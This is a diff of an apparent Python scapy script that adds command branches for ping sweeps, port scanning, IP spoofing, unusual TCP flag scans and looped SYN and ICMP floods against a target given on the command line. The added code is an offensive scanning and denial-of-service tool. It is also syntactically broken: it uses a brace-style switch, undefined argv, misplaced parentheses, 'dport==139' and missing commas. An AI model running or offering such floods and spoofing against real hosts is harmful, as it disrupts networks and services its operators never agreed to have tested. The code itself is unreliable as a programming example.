@@ -2,23 +2,24 @@ import scapy.all as scapy
 import sys
 
 switch(sys.argv[1]){
-         case "ipsweep":;
+         case "ipsweep": scapy.sr(scapy.IP(dst=argv[2]/scapy.ICMP()/argv[3]), inter=0.05);
             break;
-         case "portscan":;
+         case "portscan": scapy.sr(scapy.IP(dst=argv[2]/scapy.TCP(dport=(1,2000), flags"S")), inter=0.05);
             break;
-         case "ipspoof":;
+         case "ipspoof":scapy.sr(scapy.IP(dst=argv[2],src=argv[3]/scapy.ICMP()/argv[4]), inter=0.05);
             break;
-         case "SFflag":;
+         case "SFflag": scapy.sr(scapy.IP(dst=argv[2]/scapy.TCP(flags="SF")), inter=0.05);
             break;
-         case "Fflag":;
+         case "Fflag": scapy.sr(scapy.ip(dst=argv[2]/scapy.TCP(flags="F")), inter=0.05);
             break;
-         case "URGflag":;
+         case "URGflag":scapy.send(scapy.IP(dst=argv[2]/scapy.TCP(flags="U", dport==139)));
             break;
-         case "NOflag":;
+         case "NOflag":scapy.sr(scapy.ip(dst=argv[2]/scapy.TCP(flags="")));
             break;
-         case "SYNflood":;
+         case "SYNflood":scapy.send(scapy.ip(dst=argv[2]/scapy.TCP(flags="S", dport=139)),loop=1 inter=0.005);
             break;
-         case "ICMPflood":;
+         case "ICMPflood":scapy.send(scapy.ip(dst=argv[2]/scapy.ICMP()/argv[3]),loop=1 inter=0.005);
+
             break;
          case "DropConnection":;
             break;
